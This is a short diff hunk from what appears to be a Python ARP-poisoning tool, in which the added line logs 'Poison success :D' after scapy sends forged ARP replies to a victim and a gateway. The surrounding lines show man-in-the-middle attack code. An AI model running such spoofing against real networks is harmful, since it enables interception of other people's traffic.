@@ -83,6 +83,8 @@ class ARPPoisoner:
             sc.send(victim_arp_poison, verbose=0, iface=self.interface)
             sc.send(gateway_arp_poison, verbose=0, iface=self.interface)
 
+            log("Poison success :D")
+
         except Exception as e:
             log(f"Error during ARP poisoning: {e}")
     
